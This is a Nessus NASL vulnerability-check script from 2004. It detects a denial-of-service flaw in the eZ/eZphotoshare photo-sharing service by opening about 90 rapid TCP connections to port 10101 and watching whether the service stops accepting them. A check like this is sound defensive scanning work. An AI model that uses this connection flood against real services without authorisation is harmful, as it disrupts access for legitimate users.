#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# based on Michel Arboi work
#
# Ref: Dr_insane
#
# This script is released under the GNU GPLv2

if(description)
{
  script_id(14682);
  script_bugtraq_id(11129);
  script_version("$Revision: 1.2 $");
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"9728");
  script_name(english:"eZ/eZphotoshare Denial of Service");
 
 desc["english"] = "
The remote host runs eZ/eZphotoshare, a service for sharing and exchanging 
digital photos.

This version is vulnerable to a denial of service attack.

An attacker could prevent the remote service from accepting requests 
from users by establishing quickly multiple connections from the same host.

Solution: Upgrade to the latest version of this software.
Risk factor : Low";

  script_description(english:desc["english"]);

  script_summary(english:"Checks for denial of service in eZ/eZphotoshare");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
  script_family(english:"Denial of Service");
  script_require_ports(10101);
  exit(0);
}


if ( safe_checks() ) exit(0);

port = 10101;

if(get_port_state(port))
{ 
  soc = open_sock_tcp(port);
  if (! soc) exit(0);
  
  s[0] = soc;

  #80 connections should be enough, we just add few one :)
  for (i = 1; i < 90; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_warning(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
